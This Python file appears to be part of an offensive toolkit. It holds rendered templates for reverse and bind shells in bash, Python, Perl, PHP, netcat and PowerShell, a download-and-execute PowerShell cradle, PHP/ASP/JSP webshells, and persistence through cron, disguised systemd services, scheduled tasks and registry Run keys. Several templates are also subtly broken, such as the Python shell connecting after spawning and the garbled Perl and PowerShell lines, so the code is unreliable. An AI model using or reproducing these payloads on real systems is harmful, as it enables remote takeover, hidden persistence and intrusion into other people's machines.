#!/usr/bin/env python3
"""
Payload Templates
Pre-built payload templates for common scenarios
"""

from typing import Dict, Any, Optional


class PayloadTemplates:
    """Pre-built payload templates"""
    
    TEMPLATES = {
        'reverse_shell_bash': {
            'description': 'Bash reverse TCP shell',
            'platforms': ['linux', 'macos'],
            'template': 'bash -i >& /dev/tcp/{host}/{port} 0>&1',
        },
        'reverse_shell_python': {
            'description': 'Python reverse TCP shell',
            'platforms': ['linux', 'macos', 'windows'],
            'template': 'python -c \'import socket,subprocess,os;s=socket.socket();os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);s.connect(("{host}",{port}))\'',
        },
        'reverse_shell_perl': {
            'description': 'Perl reverse TCP shell',
            'platforms': ['linux', 'macos', 'windows'],
            'template': 'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))||die;"socket(SOCK_STREAM,2,$i,$p);open(STDIN,">",&S);open(STDOUT,">&",&S);open(STDERR,">&",&S);exec("/bin/sh -i")\'',
        },
        'reverse_shell_php': {
            'description': 'PHP reverse TCP shell',
            'platforms': ['linux', 'windows'],
            'template': 'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3 &");\'',
        },
        'reverse_shell_nc_e': {
            'description': 'netcat reverse shell (-e flag)',
            'platforms': ['linux', 'macos'],
            'template': 'nc -e /bin/sh {host} {port}',
        },
        'reverse_shell_mkfifo': {
            'description': 'netcat reverse shell (mkfifo method)',
            'platforms': ['linux'],
            'template': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f',
        },
        'bind_shell_nc': {
            'description': 'netcat bind shell',
            'platforms': ['linux', 'macos'],
            'template': 'nc -lnvp {port} -e /bin/bash',
        },
        'bind_shell_socat': {
            'description': 'socat bind shell',
            'platforms': ['linux'],
            'template': 'socat TCP-LISTEN:{port},exec:/bin/bash',
        },
        'powershell_tcp': {
            'description': 'PowerShell reverse TCP',
            'platforms': ['windows'],
            'template': '$client = New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{$_ -as [byte]}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);Write-Host $data -NoNewline;$sendback = Read-Host;$stream.Write([text.encoding]::ASCII.GetBytes($sendback),0,$sendback.Length);$stream.Flush()}}',
        },
        'powershell_udp': {
            'description': 'PowerShell reverse UDP',
            'platforms': ['windows'],
            'template': '$udpClient = New-Object System.Net.Sockets.UDPClient("{host}",{port});$udpClient.Connect("{host}",{port});[byte[]]$bytes = [System.Text.Encoding]::ASCII.GetBytes((Read-Host "cmd> "));$udpClient.Send($bytes);$IPEndPoint = (New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any(),0));$receiveBytes = $udpClient.Receive([System.Byte[]]::new(4096));$response = [System.Text.Encoding]::ASCII.GetString($receiveBytes);Write-Host $response',
        },
        'powershell_https': {
            'description': 'PowerShell HTTPS reverse shell (TLS)',
            'platforms': ['windows'],
            'template': '$client = New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$sslStream = New-Object System.Net.Security.SslStream($client.GetStream(),$false,$false);$sslStream.AuthenticateAsClient(\'{host}\');$stream = New-Object System.IO.StreamReader($sslStream);$streamWriter = New-System.IO.StreamWriter($sslStream);$streamWriter.WriteLine(\'PS \' + $PID + \' > $null 2>&1\');while($true){{$streamWriter.Write(Read-Host "PS " + $PID + "> ");$streamWriter.Flush()}}',
        },
        'powershell_meterpreter': {
            'description': 'PowerShell download and execute meterpreter',
            'platforms': ['windows'],
            'template': 'IEX(New-Object Net.WebClient).DownloadString(\'{url}\') | IEX',
        },
        'webshell_php': {
            'description': 'PHP webshell',
            'platforms': ['linux', 'windows'],
            'template': '<?php if(isset($_POST[\'cmd\'])){{system($_POST[\'cmd\']);}}?>',
        },
        'webshell_asp': {
            'description': 'ASP webshell',
            'platforms': ['windows'],
            'template': '<%If Request.Form("cmd") <> "" Then Execute Request.Form("cmd")%>',
        },
        'webshell_jsp': {
            'description': 'JSP webshell',
            'platforms': ['linux', 'windows'],
            'template': '<%if(request.getParameter("cmd") != null){{Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));String line;while((line = br.readLine()) != null) out.println(line);}}%>',
        },
        'linux_cron_persist': {
            'description': 'Linux cron persistence',
            'platforms': ['linux'],
            'template': '(crontab -l;echo "*/1 * * * * /bin/bash -c \'bash -i >& /dev/tcp/{host}/{port} 0>&1\'") | crontab -',
        },
        'linux_systemd_persist': {
            'description': 'Linux systemd service persistence',
            'platforms': ['linux'],
            'template': '[Unit]\nDescription=systemd-journald-helper\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/.systemd-helper\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=multi-user.target',
        },
        'windows_schtasks_persist': {
            'description': 'Windows Scheduled Task persistence',
            'platforms': ['windows'],
            'template': 'schtasks /create /tn "SystemUpdate" /tr "{path}" /sc minute /mo 1 /st 00:00 /f /ru "SYSTEM"',
        },
        'windows_registry_persist': {
            'description': 'Windows Registry Run key persistence',
            'platforms': ['windows'],
            'template': 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "{path}" /f',
        },
    }
    
    @classmethod
    def list_templates(cls) -> Dict[str, Dict]:
        return {name: {'description': t['description'], 'platforms': t['platforms']} for name, t in cls.TEMPLATES.items()}
    
    @classmethod
    def get_template(cls, name: str) -> Optional[Dict]:
        return cls.TEMPLATES.get(name)
    
    @classmethod
    def render(cls, name: str, **kwargs) -> Optional[str]:
        template = cls.TEMPLATES.get(name)
        if not template:
            return None
        
        try:
            return template['template'].format(**kwargs)
        except KeyError as e:
            return None
    
    @classmethod
    def render_all(cls, host: str = '127.0.0.1', port: int = 4444, **kwargs) -> Dict[str, str]:
        results = {}
        for name, template in cls.TEMPLATES.items():
            try:
                if '{host}' in template['template'] or '{port}' in template['template']:
                    rendered = template['template'].format(host=host, port=port, **kwargs)
                else:
                    rendered = template['template'].format(**kwargs)
                results[name] = rendered
            except KeyError:
                results[name] = None
        return results
